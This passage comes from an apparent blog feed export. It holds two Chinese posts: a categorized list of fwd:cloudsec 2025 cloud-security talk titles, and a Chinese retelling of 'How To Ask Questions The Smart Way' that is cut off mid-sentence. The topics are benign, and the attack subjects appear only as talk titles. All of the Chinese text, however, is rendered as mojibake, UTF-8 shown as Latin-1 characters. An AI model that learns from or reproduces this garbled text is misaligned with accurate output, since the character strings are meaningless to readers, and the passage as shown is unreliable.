Agents</li><li>é€šè¿‡æç¤ºæ ¼å¼ç»•è¿‡ AI å®‰å…¨æ§åˆ¶</li><li>â€œAI å³æœåŠ¡â€ä¸­çš„æ—¥å¿—è®°å½•æŒ‘æˆ˜</li><li>åŒé¢é—´è°ï¼šæ­éœ² AI Agent å¹³å°ä¸­çš„éšè—å¨èƒ</li><li>å’Œè¯¯æŠ¥è¯´å†è§ï¼šæ„å»ºå€¼å¾—ä¿¡èµ–çš„ IaC åˆ†æ AI</li><li>å¾®è½¯å¦‚ä½•åº”å¯¹äº‘é©±åŠ¨çš„æ·±åº¦ä¼ªé€ å¨èƒ</li><li>é©¯æœ LLMï¼Œç”¨äºæ£€æµ‹äº‘å®¡è®¡æ—¥å¿—ä¸­çš„å¼‚å¸¸</li></ol><h3 id="ç±»åˆ«äºŒï¼šèº«ä»½ä¸è®¿é—®ç®¡ç†-IAM"><a href="#ç±»åˆ«äºŒï¼šèº«ä»½ä¸è®¿é—®ç®¡ç†-IAM" class="headerlink" title="ç±»åˆ«äºŒï¼šèº«ä»½ä¸è®¿é—®ç®¡ç† IAM"></a>ç±»åˆ«äºŒï¼šèº«ä»½ä¸è®¿é—®ç®¡ç† IAM</h3><p>IAM ä»ç„¶æ˜¯äº‘å®‰å…¨ä¸­æœ€æ£˜æ‰‹çš„é—®é¢˜ï¼Œè¿™ä¸€ä¸»é¢˜çš„æ¼”è®²æ•°é‡æœ€å¤šï¼Œå…±æœ‰ 15 åœºæ¼”è®²ï¼š</p><ol><li>ECS-capeï¼šåŠ«æŒ Amazon ECS ä¸­çš„ IAM æƒé™</li><li>å¿«ä¹å°äº‘ï¼šç”¨å¾®è½¯äº‘å’Œèº«ä»½æ•°æ®â€œç”»ç”»â€</li><li>I SPyï¼šé‡æ–°æ€è€ƒ Entra ID çš„ç ”ç©¶ï¼Œå‘æ˜è·å–å…¨å±€ç®¡ç†å‘˜çš„æ–°è·¯å¾„</li><li>IAM Roles Anywhere + Letâ€™s Encryptï¼šè®©äººäººéƒ½èƒ½ç”¨</li><li>æ—  IP ä¹Ÿèƒ½æäº‹ï¼šç»•è¿‡ IAP è¿›è¡Œæ•°æ®å¤–æ³„</li><li>ä¸é‚£ä¹ˆç§˜å¯†ï¼šGitHub Actions Secrets çš„éšè—é£é™©</li><li>Workload Identity å®è·µï¼šå°† SPIFFE ç”¨åœ¨ç”Ÿäº§ç¯å¢ƒ</li><li>ä¸ºç°ä»£ Entra ç¯å¢ƒé‡æ„ ROADRecon</li><li>ä¿æŠ¤è¿œç¨‹ MCP æœåŠ¡å™¨</li><li>åœ¨ Office 365 ä¸­ä¿æŒéšç§˜</li><li>AWS IAM çš„åŒé¢æ€§</li><li>è™šå‡çš„å®‰å…¨æ„Ÿï¼šé˜²å¾¡å¦‚ä½•å˜æˆæ¼æ´</li><li>ä¿¡ä»»é—®é¢˜ï¼šè¿™äº› JSON æ–‡ä»¶åˆ°åº•ä»£è¡¨ä»€ä¹ˆï¼Ÿ</li><li>å¦‚æœèƒ½ç”¨æ°´æ™¶çƒé¢„æµ‹ IAM ä¼šé—®ä»€ä¹ˆï¼Ÿ</li><li>å½“ä½ çš„äº‘ä¼™ä¼´èƒŒå›ä½ ï¼šäº‘ä¸­ä¿¡ä»»å…³ç³»è¢«æ”»ç ´</li></ol><h3 id="ç±»åˆ«ä¸‰ï¼šå¨èƒç‹©çŒä¸æ£€æµ‹"><a href="#ç±»åˆ«ä¸‰ï¼šå¨èƒç‹©çŒä¸æ£€æµ‹" class="headerlink" title="ç±»åˆ«ä¸‰ï¼šå¨èƒç‹©çŒä¸æ£€æµ‹"></a>ç±»åˆ«ä¸‰ï¼šå¨èƒç‹©çŒä¸æ£€æµ‹</h3><p>ä¸“æ³¨äºè¯†åˆ«ä¸å‘ç°å¨èƒï¼Œå…±æœ‰ 3 åœºæ¼”è®²ï¼š</p><ol><li>å‘ç°ä¸å¯è§ï¼šè®¾å¤‡ç¯å¢ƒä¸­çš„å¨èƒç‹©çŒ</li><li>çŒäººå¿ƒæ³•ï¼šä¸€å¹´äº‘ç«¯å¨èƒç‹©çŒç»éªŒæ€»ç»“</li><li>â€œèµ„æºæœªæ‰¾åˆ°â€ï¼Ÿææ‡‚ GCP é”™è¯¯ç ç”¨äºåº”æ€¥å“åº”å’Œæ£€æµ‹</li></ol><h3 id="ç±»åˆ«å››ï¼šæ”»å‡»æŠ€æœ¯ä¸æ¼æ´"><a href="#ç±»åˆ«å››ï¼šæ”»å‡»æŠ€æœ¯ä¸æ¼æ´" class="headerlink" title="ç±»åˆ«å››ï¼šæ”»å‡»æŠ€æœ¯ä¸æ¼æ´"></a>ç±»åˆ«å››ï¼šæ”»å‡»æŠ€æœ¯ä¸æ¼æ´</h3><p>ç†è§£æ”»å‡»è€…çš„è§†è§’ï¼Œå…±æœ‰ 3 åœºæ¼”è®²ï¼š</p><ol><li>é˜²å®ˆè€…è®¨åŒè¿™æ‹›ï¼šç”¨ä¸€ä¸ªâ€œæ€ªæ‹›â€æå®šæ˜“å—æ”»å‡»çš„ SaaS åº”ç”¨</li><li>ä¸€æ¬¡æ‰“ä¸‰å®¶ CSPï¼šä¸€ä¸ªæ¼æ´å¸¦æ¥çš„å¥½ã€åä¸ä¸‘</li><li>whoAMIï¼šå‘ç°å¹¶åˆ©ç”¨ AMI åç§°æ··æ·†å¤§è§„æ¨¡æ”»å‡»</li></ol><h3 id="ç±»åˆ«äº”ï¼šäº‘æ¶æ„ä¸åŸºç¡€è®¾æ–½"><a href="#ç±»åˆ«äº”ï¼šäº‘æ¶æ„ä¸åŸºç¡€è®¾æ–½" class="headerlink" title="ç±»åˆ«äº”ï¼šäº‘æ¶æ„ä¸åŸºç¡€è®¾æ–½"></a>ç±»åˆ«äº”ï¼šäº‘æ¶æ„ä¸åŸºç¡€è®¾æ–½</h3><p>å®æˆ˜æŒ‡å—ä¸æ¶æ„ç»éªŒï¼Œå…±æœ‰ 13 åœºæ¼”è®²ï¼š</p><ol><li>è¶…è¶Šä¸‰å·¨å¤´ï¼šæŒæ¡ Oracle Cloud åœ¨å¤šäº‘ç¯å¢ƒä¸‹çš„å®‰å…¨å®è·µ</li><li>å¤§å‹ AWS ç¯å¢ƒä¸­å®æ–½å‡ºå£æ§åˆ¶çš„æŒ‘æˆ˜</li><li>æ•°æ®è¾¹ç•Œç­–ç•¥å®è·µï¼šSCP ä¸ RCP çš„è½åœ°ç»éªŒ</li><li>â€œæˆ‘æ²¡æ³¨å†Œè¿™ä¸ªâ€ï¼šè§£è¯» Google Artifact Registry çš„çœŸå®å†…å®¹</li><li>å¼•å…¥ GRC å·¥ç¨‹ï¼šå¼€å¯ AWS åˆè§„æ–°çºªå…ƒ</li><li>é‚€è¯·è€…å¨èƒï¼šæ–°å‹äº‘éƒ¨ç½²æ¨¡å‹ä¸‹çš„å®‰å…¨ç®¡ç†</li><li>ä¼ä¸šåˆå¹¶æ”¶è´­æœŸé—´ï¼Œå¦‚ä½•ä¿éšœäº‘ç¯å¢ƒå®‰å…¨</li><li>æ—¥å¿—æ²¡ä½ æƒ³çš„æœ‰ç”¨ï¼šè§£æ IaC ä¸­çš„èº«ä»½å½’å±</li><li>ML å’Œ LLMOps éƒ¨ç½²å®‰å…¨ï¼šå¹³å°æ¶æ„å¸ˆçš„å¼•å…¥ç»éªŒ</li><li>GPU å…±äº«å®‰å…¨ï¼š<a href="http://fly.io/" title="Fly.io">Fly.io</a> çš„ç»éªŒæ€»ç»“</li><li>å¥½çš„ã€åçš„å’Œæ¼æ´ç™¾å‡ºçš„ GCP ç§Ÿæˆ·é¡¹ç›®è§£æ</li><li>è¿™å·¥ä½œä¸æ˜¯æˆ‘æŠ¥åçš„ï¼šä»é›¶æ„å»ºç”Ÿäº§çº§ AWS ç¯å¢ƒ</li><li>ä½ ä¸æ˜¯ Netflixï¼šå¦‚ä½•æ­£ç¡®å€Ÿé‰´å¤§ä¼šæ¼”è®²å†…å®¹</li></ol><h3 id="å…¶å®ƒï¼šå¼€åœºä¸é—­å¹•ï¼ˆ2-åœºæ¼”è®²ï¼‰"><a href="#å…¶å®ƒï¼šå¼€åœºä¸é—­å¹•ï¼ˆ2-åœºæ¼”è®²ï¼‰" class="headerlink" title="å…¶å®ƒï¼šå¼€åœºä¸é—­å¹•ï¼ˆ2 åœºæ¼”è®²ï¼‰"></a>å…¶å®ƒï¼šå¼€åœºä¸é—­å¹•ï¼ˆ2 åœºæ¼”è®²ï¼‰</h3><p>ä½œä¸ºå¤§ä¼šçš„æ”¶å°¾ï¼Œä¸ºä¸ä¼šè€…æä¾›èƒŒæ™¯ä¸å¹•åèŠ±çµ®ã€‚æˆ‘ç‰¹åˆ«å–œæ¬¢è¿™ç§é€æ˜æ„Ÿã€‚</p><h2 id="0x02-æ€»ç»“"><a href="#0x02-æ€»ç»“" class="headerlink" title="0x02 æ€»ç»“"></a>0x02 æ€»ç»“</h2><p>å¾ˆå¤šå¤§ä¼šçš„æ¼”è®²å…¶å®éƒ½å¾ˆæœ‰æ–™ï¼Œä½†è¯´å®è¯ï¼Œå¤§å¤šæ•°äººæ ¹æœ¬æŒ¤ä¸å‡º 20 åˆ†é’Ÿå»ä¸€åœºåœºç‚¹å¼€çœ‹ã€‚æ›´å°´å°¬çš„æ˜¯â€”â€”ä½ å‹æ ¹ä¸çŸ¥é“è®²çš„å†…å®¹æ˜¯ä¸æ˜¯ä½ å…³å¿ƒçš„æ–¹å‘ã€‚</p><p>æˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä»½ fwd:cloudsec 2025 çš„æ¼”è®²èµ„æ–™ï¼Œå¸Œæœ›èƒ½å¸®ä½ <strong>å¿«é€Ÿåˆ¤æ–­å“ªäº›å€¼å¾—ç‚¹å¼€æ·±å…¥çœ‹ï¼Œå“ªäº›å¯ä»¥å…ˆè·³è¿‡</strong>ï¼ŒèŠ‚çœæ—¶é—´ã€ç›´å¥”å¹²è´§ã€‚</p><p>å¦‚æœä½ è§‰å¾—è¿™ä»½æ•´ç†å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä¹Ÿæ¬¢è¿è½¬å‘ç»™æœ‹å‹ä¸€èµ·çœ‹ï¼Œè®©æ›´å¤šäººå°‘è¸©å‘ã€å¤šå¸æ”¶ç‚¹å®æˆ˜çŸ¥è¯†ï¼x</p>]]></content>
    
    
    
    <tags>
      
      <tag>äº‘å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•åƒé«˜æ‰‹ä¸€æ ·æé—®</title>
    <link href="/2025/07/30/%E5%A6%82%E4%BD%95%E5%83%8F%E9%AB%98%E6%89%8B%E4%B8%80%E6%A0%B7%E6%8F%90%E9%97%AE/"/>
    <url>/2025/07/30/%E5%A6%82%E4%BD%95%E5%83%8F%E9%AB%98%E6%89%8B%E4%B8%80%E6%A0%B7%E6%8F%90%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è¿‘æœŸï¼Œæˆ‘å­¦ä¹ äº†ä¸€ä»½å…³äºå¦‚ä½•æé—®çš„æ–‡ç« ï¼Œåˆ†äº«ç»™å¤§å®¶ä¸€èµ·çœ‹çœ‹ã€‚è¿™ä»½æŒ‡å—ç”± Eric S. Raymond å’Œ Rick Moen æ’°å†™ï¼Œå·²è¢«å¹¿æ³›å¼•ç”¨ï¼Œæ˜¯å¼€å‘è€…åœˆå…¬è®¤çš„â€œæé—®åœ£ç»â€ã€‚ä¸­æ–‡è¯‘æ–‡åŸºäºåŸæ–‡ 3.10 ç‰ˆï¼Œå¤§å®¶å¯ä»¥é€šè¿‡ <a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/pulls">PR</a> æˆ– <a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/issues">issue</a> å‚ä¸ç¿»è¯‘æ”¹è¿›ã€‚</p><p>åŸæ–‡åœ°å€ï¼š<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md</a></p><h2 id="0x01-æé—®å‰ï¼šå…ˆæŸ¥æ‰¾ã€å…ˆæ€è€ƒ"><a href="#0x01-æé—®å‰ï¼šå…ˆæŸ¥æ‰¾ã€å…ˆæ€è€ƒ" class="headerlink" title="0x01 æé—®å‰ï¼šå…ˆæŸ¥æ‰¾ã€å…ˆæ€è€ƒ"></a>0x01 æé—®å‰ï¼šå…ˆæŸ¥æ‰¾ã€å…ˆæ€è€ƒ</h2><p>å½“æ‚¨å‡†å¤‡é€šè¿‡ç”µå­é‚®ä»¶ã€ç¾¤èŠæˆ–èŠå¤©å®¤æå‡ºæŠ€æœ¯é—®é¢˜å‰ï¼Œè¯·å…ˆåšåˆ°ä»¥ä¸‹äº‹æƒ…ï¼š</p><ol><li><strong>å…ˆæœæœçœ‹åˆ«äººæœ‰æ²¡æœ‰é‡åˆ°è¿‡</strong>ï¼Œè®ºå›ã€Issueã€åšå®¢éƒ½é€›ä¸€åœˆï¼Œè¯´ä¸å®šåˆ«äººå·²ç»è§£å†³äº†ã€‚</li><li><strong>ç½‘ä¸Šæœä¸€æœå…³é”®è¯</strong>ï¼Œåˆ«ç€æ€¥é—®ï¼Œâ€œç™¾åº¦&#x2F;Google ä¸€ä¸‹â€æœ‰æ—¶å€™èƒ½ç«‹é©¬è§£å†³é—®é¢˜ã€‚</li><li><strong>çœ‹çœ‹é¡¹ç›®çš„ä½¿ç”¨è¯´æ˜æˆ–æ–‡æ¡£</strong>ï¼Œé‡Œé¢ä¸€èˆ¬ä¼šè®²æ¸…æ¥šæ€ä¹ˆç”¨ã€å¸¸è§é—®é¢˜æœ‰å“ªäº›ã€‚</li><li><strong>æ‰¾æ‰¾æœ‰æ²¡æœ‰ FAQï¼ˆå¸¸è§é—®é¢˜åˆ—è¡¨ï¼‰</strong>ï¼Œå¾ˆå¤šå‘ä½œè€…æ—©å°±æ€»ç»“å¥½äº†ã€‚</li><li><strong>è‡ªå·±å¤šåŠ¨æ‰‹è¯•è¯•</strong>ï¼Œæ¢ä¸ªå‚æ•°ã€æ¢ä¸ªç¯å¢ƒè·‘ä¸€ä¸‹ï¼Œè¯´ä¸å®šå°±æ‘¸ç´¢å‡ºæ¥äº†ã€‚</li><li><strong>é—®é—®èº«è¾¹æ‡‚çš„äºº</strong>ï¼ŒåŒäº‹ã€æœ‹å‹ã€å¸ˆå…„å¸ˆå§ä¹Ÿè®¸ä¸€ä¸‹å°±èƒ½ç‚¹é†’ä½ ã€‚</li><li><strong>å¦‚æœä½ æ‡‚ç‚¹ç¼–ç¨‹ï¼Œå°±ç¿»ç¿»æºç </strong>ï¼Œå¾ˆå¤šæ—¶å€™é—®é¢˜çš„ç­”æ¡ˆå°±è—åœ¨ä»£ç é‡Œã€‚</li></ol><h3 id="1-1-æé—®å‰ï¼Œå…ˆæŠŠåŠŸè¯¾åšè¶³ä¸€ç‚¹ç‚¹"><a href="#1-1-æé—®å‰ï¼Œå…ˆæŠŠåŠŸè¯¾åšè¶³ä¸€ç‚¹ç‚¹" class="headerlink" title="1.1 æé—®å‰ï¼Œå…ˆæŠŠåŠŸè¯¾åšè¶³ä¸€ç‚¹ç‚¹"></a>1.1 æé—®å‰ï¼Œå…ˆæŠŠåŠŸè¯¾åšè¶³ä¸€ç‚¹ç‚¹</h3><p>åœ¨ä½ å¼€å£é—®é—®é¢˜ä¹‹å‰ï¼Œæœ€å¥½å…ˆè®©åˆ«äººçŸ¥é“ï¼š<strong>ä½ å·²ç»åŠªåŠ›æ‰¾è¿‡ç­”æ¡ˆäº†</strong>ï¼Œè€Œä¸æ˜¯ä¸€ä¸Šæ¥å°±ä¼¸æ‰‹ã€‚è¿™æ ·åˆ«äººæ›´æ„¿æ„å¸®ä½ ï¼Œä¹Ÿèƒ½çœ‹å‡ºä½ æ˜¯ä¸€ä¸ªæ„¿æ„å­¦ä¹ ã€å°Šé‡ä»–äººæ—¶é—´çš„äººã€‚</p><p>æ¯”å¦‚ä½ å¯ä»¥è¿™ä¹ˆåšï¼š</p><ul><li>åœ¨ Google ä¸Šæœç´¢ä½ é‡åˆ°çš„æŠ¥é”™ä¿¡æ¯æˆ–å…³é”®è¯ï¼ˆåŒ…æ‹¬è®ºå›ã€ç½‘é¡µã€æ—§è´´å­ï¼‰ã€‚</li><li>é˜…è¯»å®˜æ–¹æ–‡æ¡£ã€FAQ æˆ–æ‰‹å†Œï¼Œçœ‹æ˜¯ä¸æ˜¯å·²ç»æœ‰äº†è§£ç­”ã€‚</li><li>è‡ªå·±åŠ¨æ‰‹è¯•äº†å‡ ç§æ–¹æ³•ï¼Œæ¯”å¦‚æ”¹å‚æ•°ã€æ¢ç¯å¢ƒã€åŠ æ‰“å°çœ‹çœ‹æ—¥å¿—ã€‚</li><li>å¦‚æœä½ æœä¸åˆ°ç­”æ¡ˆï¼Œä¹Ÿå¯ä»¥é¡ºæ‰‹å†™ä¸€å¥ï¼š  â€œæˆ‘åœ¨ Google ä¸Šæœäº†<code>XXX</code>å’Œ<code>YYY</code>ï¼Œä½†æ²¡æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯ã€‚â€</li></ul><p>è¿™æ ·ä¸ä»…èƒ½å¸®åˆ«äººæ›´å¿«ç†è§£ä½ å¡åœ¨å“ªé‡Œäº†ï¼Œä¹Ÿå¯èƒ½å¸®å°†æ¥é‡åˆ°ç›¸åŒé—®é¢˜çš„äººé€šè¿‡æœç´¢æ‰¾åˆ°ä½ çš„æé—®ã€‚</p><h3 id="1-2-ä¸è¦ç€æ€¥ï¼Œè®¤çœŸæ€è€ƒä½ çš„é—®é¢˜"><a href="#1-2-ä¸è¦ç€æ€¥ï¼Œè®¤çœŸæ€è€ƒä½ çš„é—®é¢˜" class="headerlink" title="1.2 ä¸è¦ç€æ€¥ï¼Œè®¤çœŸæ€è€ƒä½ çš„é—®é¢˜"></a>1.2 ä¸è¦ç€æ€¥ï¼Œè®¤çœŸæ€è€ƒä½ çš„é—®é¢˜</h3><p>åˆ«æŒ‡æœ› 10 ç§’é’Ÿçš„æœç´¢å°±èƒ½è§£å†³ä¸€ä¸ªå¤æ‚é—®é¢˜ã€‚åœ¨ä½ å†³å®šâ€œå‘é—®â€çš„é‚£ä¸€åˆ»ï¼Œä¸å¦¨ï¼š</p><ul><li>ç¨å¾®æ”¾æ¾ä¸€ä¸‹ï¼Œåå¥½ï¼Œå›é¡¾ä¸€ä¸‹ä½ é‡åˆ°çš„é—®é¢˜ï¼›</li><li>ä»”ç»†ç¢ç£¨ä¸‹é—®é¢˜æœ¬è´¨æ˜¯ä»€ä¹ˆï¼›</li><li>æŠŠæƒ³é—®çš„ä¸œè¥¿<strong>æ•´ç†æ¸…æ¥šå†å‘å‡ºæ¥</strong>ï¼›</li><li>å°½é‡ä¸è¦ä¸€è‚¡è„‘ç”©ä¸€å¤§å †æ²¡æ•´ç†å¥½çš„ä¿¡æ¯ã€‚</li></ul><p>å› ä¸ºï¼š<strong>è‰ç‡çš„é—®é¢˜åªä¼šæ¢æ¥è‰ç‡çš„å›ç­”ï¼Œç”šè‡³æ²¡äººå›ç­”ã€‚</strong></p><h3 id="1-3-æé—®æ—¶ï¼Œå°½é‡åˆ«å¸¦é”™æ–¹å‘"><a href="#1-3-æé—®æ—¶ï¼Œå°½é‡åˆ«å¸¦é”™æ–¹å‘" class="headerlink" title="1.3 æé—®æ—¶ï¼Œå°½é‡åˆ«å¸¦é”™æ–¹å‘"></a>1.3 æé—®æ—¶ï¼Œå°½é‡åˆ«å¸¦é”™æ–¹å‘</h3><p>å¦‚æœä½ æå‡ºçš„é—®é¢˜æ˜¯åŸºäºä¸€ä¸ªé”™è¯¯çš„å‡è®¾ï¼Œé‚£æœ‰ç»éªŒçš„äººå¯èƒ½ä¼šç”¨ä¸€äº›â€œè¡¨é¢å›ç­”â€å¼•å¯¼ä½ ï¼Œå¸Œæœ›ä½ è‡ªå·±èƒ½ä»ä¸­åæ€â€”â€”è€Œä¸æ˜¯ç›´æ¥ç»™ä½ â€œä½ æƒ³å¬çš„ç­”æ¡ˆâ€ã€‚</p><p>æ‰€ä»¥æé—®å‰ï¼Œä¸å¦¨å…ˆç¡®è®¤ï¼š</p><ul><li>ä½ ç†è§£çš„é—®é¢˜èƒŒæ™¯æ˜¯å¦å‡†ç¡®ï¼›</li><li>æ˜¯ä¸æ˜¯ä»ç°è±¡ä¸­æ¨å¯¼å‡ºäº†ä¸€ä¸ªé”™è¯¯çš„ç»“è®ºï¼›</li><li>ä½ çš„æé—®æ˜¯å¦åªæ˜¯æƒ³è®©åˆ«äººå¸®ä½ â€œå¤åˆ¶ç²˜è´´â€ä¸€ä¸ªè§£å†³æ–¹æ¡ˆã€‚</li></ul><h3 id="1-4-ä½ ä¸â€œé…â€è¢«å›ç­”ï¼Œä½†ä½ å¯ä»¥â€œèµ¢å¾—â€ç­”æ¡ˆ"><a href="#1-4-ä½ ä¸â€œé…â€è¢«å›ç­”ï¼Œä½†ä½ å¯ä»¥â€œèµ¢å¾—â€ç­”æ¡ˆ" class="headerlink" title="1.4 ä½ ä¸â€œé…â€è¢«å›ç­”ï¼Œä½†ä½ å¯ä»¥â€œèµ¢å¾—â€ç­”æ¡ˆ"></a>1.4 ä½ ä¸â€œé…â€è¢«å›ç­”ï¼Œä½†ä½ å¯ä»¥â€œèµ¢å¾—â€ç­”æ¡ˆ</h3><p>æ²¡äººæœ‰ä¹‰åŠ¡å›ç­”ä½ çš„é—®é¢˜ï¼Œå°¤å…¶æ˜¯å½“ä½ æ²¡ä»˜å‡ºåŠªåŠ›æ—¶ã€‚ä½†å¦‚æœä½ èƒ½æå‡ºä¸€ä¸ª<strong>æ¸…æ™°ã€æœ‰é€»è¾‘ã€æœ‰è¶£ã€èƒ½å¯å‘åˆ«äººæ€è€ƒçš„é—®é¢˜</strong> â€”â€” é‚£ä¹ˆä½ å¯èƒ½ä¸ä»…ä¼šå¾—åˆ°å¸®åŠ©ï¼Œè¿˜ä¼šä¸ºæ•´ä¸ªç¤¾åŒºç•™ä¸‹ä»·å€¼ã€‚</p><p>æ¢å¥è¯è¯´ï¼š<strong>ç”¨ä½ è‡ªå·±çš„åŠªåŠ›å’Œæ€è€ƒï¼Œå»â€œæ¢â€ä¸€ä¸ªåˆ«äººæ„¿æ„æŠ•å…¥æ—¶é—´çš„ç­”å¤ã€‚</strong></p><h3 id="1-5-æ¯”â€œè¦ç­”æ¡ˆâ€æ›´å¥½çš„ï¼Œæ˜¯â€œè¦æ–¹å‘â€"><a href="#1-5-æ¯”â€œè¦ç­”æ¡ˆâ€æ›´å¥½çš„ï¼Œæ˜¯â€œè¦æ–¹å‘â€" class="headerlink" title="1.5 æ¯”â€œè¦ç­”æ¡ˆâ€æ›´å¥½çš„ï¼Œæ˜¯â€œè¦æ–¹å‘â€"></a>1.5 æ¯”â€œè¦ç­”æ¡ˆâ€æ›´å¥½çš„ï¼Œæ˜¯â€œè¦æ–¹å‘â€</h3><p>å¦‚æœä½ è¿˜ä¸çŸ¥é“æ€ä¹ˆæå…·ä½“é—®é¢˜ï¼Œé‚£å°±æ¢ä¸ªæ–¹å¼è¯´ï¼Œæ¯”å¦‚ï¼š</p><ul><li>â€œæˆ‘å°è¯•äº† X å’Œ Yï¼Œä½†æ•ˆæœä¸å¯¹ï¼Œæ˜¯ä¸æ˜¯å“ªé‡Œè¿˜éœ€è¦æ³¨æ„ï¼Ÿâ€</li><li>â€œæˆ‘æ˜¯ä¸æ˜¯æ¼æ‰äº†ä»€ä¹ˆæ¡ä»¶ï¼Ÿâ€</li><li>â€œæˆ‘æŸ¥äº†ä¸€åœˆï¼Œè¿˜æ˜¯æä¸æ˜ç™½è¿™ä¸ªç¯èŠ‚çš„åŸç†ï¼Œèƒ½ä¸èƒ½ç»™ç‚¹æ–¹å‘ï¼Ÿâ€</li></ul><p>è¿™äº›é—®é¢˜<strong>æ¯”â€œä½ å¸®æˆ‘å†™ä¸€ä¸‹ä»£ç å§â€æ›´å®¹æ˜“è·å¾—åˆ«äººçœŸå¿ƒçš„å¸®åŠ©ã€‚</strong></p><h2 id="0x02-æé—®æ—¶ï¼šç»“æ„åŒ–-æœ‰ç¤¼è²Œ"><a href="#0x02-æé—®æ—¶ï¼šç»“æ„åŒ–-æœ‰ç¤¼è²Œ" class="headerlink" title="0x02 æé—®æ—¶ï¼šç»“æ„åŒ– + æœ‰ç¤¼è²Œ"></a>0x02 æé—®æ—¶ï¼šç»“æ„åŒ– + æœ‰ç¤¼è²Œ</h2><h3 id="2-1-é€‰å¯¹åœ°æ–¹ï¼Œæå¯¹æ–¹å¼ï¼ˆæé—®å‰çš„å‡†å¤‡ï¼‰"><a href="#2-1-é€‰å¯¹åœ°æ–¹ï¼Œæå¯¹æ–¹å¼ï¼ˆæé—®å‰çš„å‡†å¤‡ï¼‰" class="headerlink" title="2.1 é€‰å¯¹åœ°æ–¹ï¼Œæå¯¹æ–¹å¼ï¼ˆæé—®å‰çš„å‡†å¤‡ï¼‰"></a>2.1 <strong>é€‰å¯¹åœ°æ–¹ï¼Œæå¯¹æ–¹å¼</strong>ï¼ˆæé—®å‰çš„å‡†å¤‡ï¼‰</h3><h4 id="æ…é€‰æé—®çš„åœ°æ–¹"><a href="#æ…é€‰æé—®çš„åœ°æ–¹" class="headerlink" title="æ…é€‰æé—®çš„åœ°æ–¹"></a>æ…é€‰æé—®çš„åœ°æ–¹</h4><p>åˆ«éšä¾¿åœ¨å“ªä¸ªå¹³å°å‘é—®ï¼Œå°¤å…¶æ˜¯ä¸»é¢˜ä¸å¯¹çš„åœ°æ–¹ã€‚æ¯”å¦‚ï¼š</p><ul><li>åœ¨æ™®é€šç”¨æˆ·è®ºå›é‡Œé—®å¾ˆä¸“ä¸šçš„é—®é¢˜ï¼Œæˆ–åœ¨é«˜çº§æŠ€æœ¯ç¾¤é‡Œé—®æ–°æ‰‹é—®é¢˜ã€‚</li><li>å¤šä¸ªåœ°æ–¹é‡å¤å‘åŒæ ·é—®é¢˜ä¹Ÿä¸å¥½ã€‚</li><li>å«é™Œç”Ÿäººç§ä¿¡ä½ ï¼Œé€šå¸¸ä¹Ÿä¸ä¼šæŒºçƒ­æƒ…ã€‚</li></ul><p>è¦åšçš„æ˜¯ï¼šå…ˆç¡®è®¤ä½ çš„é—®é¢˜å±å“ªä¸ªå¹³å°æœ€åˆé€‚ï¼Œå†æœç´¢è¯¥è®ºå›çš„ FAQã€å†å²è´´ï¼Œäº†è§£æ–‡åŒ–åå†æé—®ã€‚</p><h4 id="åˆ«è¦æ±‚ç§èŠ"><a href="#åˆ«è¦æ±‚ç§èŠ" class="headerlink" title="åˆ«è¦æ±‚ç§èŠ"></a>åˆ«è¦æ±‚ç§èŠ</h4><p>ä¸è¦è¦æ±‚å›å¤ç§ä¿¡æˆ–é‚®ä»¶ã€‚å…¬å¼€é—®ç­”å¯¹å¤§å®¶éƒ½æœ‰ç›Šï¼Œä¹Ÿè®©å¸®åŠ©è¿‡ä½ çš„äººè·å¾—æˆå°±æ„Ÿã€‚å¦‚æœä½ è§‰å¾—å›å¤ä¼šå¤ªå¤šé›·åŒï¼Œå¯ä»¥è¯´â€œå¦‚æœå›å¤å¾ˆå¤šï¼Œè¯·å‘é‚®ä»¶ç»™æˆ‘æ•´ç†â€ã€‚</p><h4 id="æ ‡é¢˜é‡Œä¸è¦å†™â€œç´§æ€¥â€"><a href="#æ ‡é¢˜é‡Œä¸è¦å†™â€œç´§æ€¥â€" class="headerlink" title="æ ‡é¢˜é‡Œä¸è¦å†™â€œç´§æ€¥â€"></a>æ ‡é¢˜é‡Œä¸è¦å†™â€œç´§æ€¥â€</h4><p>å†™â€œç´§æ€¥â€å¾€å¾€é€‚å¾—å…¶åï¼šè®©äººåæ„Ÿï¼Œç”šè‡³è¢«è¿‡æ»¤ã€‚é™¤éä½ çŸ¥é“ä½ çš„é—®é¢˜æ ¸å¿ƒæ˜¯çƒ­é—¨è¯é¢˜ä¸”è¿…é€Ÿèƒ½å¼•å‘ä¸“ä¸šå…³æ³¨ï¼Œå¦åˆ™å°½é‡ä¸è¦ç”¨â€œæ€¥â€â€œç´§æ€¥â€ç­‰æ ‡ç­¾ã€‚</p><h3 id="2-2-æ ‡é¢˜ä¸è¡¨è¾¾æŠ€å·§ï¼ˆæé—®æ—¶çš„å½¢å¼ï¼‰"><a href="#2-2-æ ‡é¢˜ä¸è¡¨è¾¾æŠ€å·§ï¼ˆæé—®æ—¶çš„å½¢å¼ï¼‰" class="headerlink" title="2.2 æ ‡é¢˜ä¸è¡¨è¾¾æŠ€å·§ï¼ˆæé—®æ—¶çš„å½¢å¼ï¼‰"></a>2.2 æ ‡é¢˜ä¸è¡¨è¾¾æŠ€å·§ï¼ˆæé—®æ—¶çš„å½¢å¼ï¼‰</h3><h4 id="æ ‡é¢˜è¦ç®€æ´æ˜ç¡®"><a href="#æ ‡é¢˜è¦ç®€æ´æ˜ç¡®" class="headerlink" title="æ ‡é¢˜è¦ç®€æ´æ˜ç¡®"></a>æ ‡é¢˜è¦ç®€æ´æ˜ç¡®</h4><p>50 å­—ä»¥å†…ï¼Œç²¾å‡†è¡¨è¾¾é—®é¢˜ã€‚æ ‡é¢˜é‡Œä¸è¦å†™â€œæ•‘å‘½â€â€œæ€¥â€ç­‰æƒ…ç»ªè¯ï¼Œè€Œæ˜¯ç”¨â€œç›®æ ‡ â€“ 